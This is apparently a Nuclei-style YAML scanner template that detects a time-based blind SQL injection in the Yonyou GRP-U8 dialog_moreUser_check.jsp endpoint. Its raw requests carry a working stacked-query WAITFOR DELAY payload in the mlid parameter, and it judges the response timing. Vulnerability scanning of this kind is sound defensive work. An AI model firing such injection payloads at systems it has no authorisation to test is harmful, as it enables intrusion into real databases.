id: poc-yaml-yongyou-grp-u8-dialog-moreUser-check-sqli
info:
  name: 用友GRP-U8 dialog_moreUser_check SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友GRP-U8
  description: |
    Detects SQL Injection vulnerability in 用友 GRP-U8 dialog_moreUser_check endpoint.

flow: |
  http(1) && http(2)

http:
  - id: check-grp-u8
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "GRP-U8"

  - id: sqli-test
    raw:
      - |
        GET /u8qx/dialog_moreUser_check.jsp?mlid=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /u8qx/dialog_moreUser_check.jsp?mlid=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
